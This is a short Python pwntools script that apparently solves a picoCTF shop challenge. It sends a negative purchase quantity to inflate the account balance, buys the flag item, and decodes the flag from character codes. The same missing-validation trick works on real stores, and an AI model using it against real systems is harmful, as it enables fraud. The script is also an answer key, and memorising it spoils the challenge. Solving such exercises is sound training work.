#!/usr/bin/env python3

from pwn import *

HOST = 'mercury.picoctf.net'
PORT = 37799

context.log_level = 'error'

r = remote(HOST, PORT)

r.sendlineafter(b'Choose an option: \n', b'0')
r.sendlineafter(b'How many do you want to buy?\n', b'-10')
r.sendlineafter(b'Choose an option: \n', b'2')
r.sendlineafter(b'How many do you want to buy?\n', b'1')

flag = str(r.recvline().decode('ascii'))
flag = flag.split('[')[1].split(']')[0].split(' ')

print("".join([chr(int(x, 10)) for x in flag]))
